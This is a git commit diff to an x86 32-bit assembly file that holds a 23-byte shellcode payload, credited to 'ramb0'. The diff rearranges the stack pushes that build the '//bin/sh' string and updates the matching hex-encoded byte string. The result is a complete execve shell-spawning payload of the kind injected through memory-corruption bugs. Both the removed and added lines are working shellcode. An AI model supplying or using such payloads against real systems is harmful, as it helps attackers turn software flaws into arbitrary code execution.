f57ba72fd4f45dc47deb307e57d083081e516295
trisna22 <trisna@live.nl>
2021-02-09 17:28:40 +0100

    Added changes and string fixes in the code

--- spawn_shell/spawn_shell.asm
+++ spawn_shell/spawn_shell.asm
@@ -1,7 +1,7 @@
 
 ; x32 bit shellcode by ramb0
 ; 23 bytes long
-; \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
+; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
 
 section .text
 global _start
@@ -11,8 +11,8 @@ _start:
 	push eax		; string terminator
 
 	; //bin/sh
-	push 0x68732f2f
-	push 0x6e69622f
+	push 0x68732f6e
+	push 0x69622f2f
 	mov ebx, esp		; move stack buffer to ebx
 	xor ecx, ecx
 	xor edx, edx
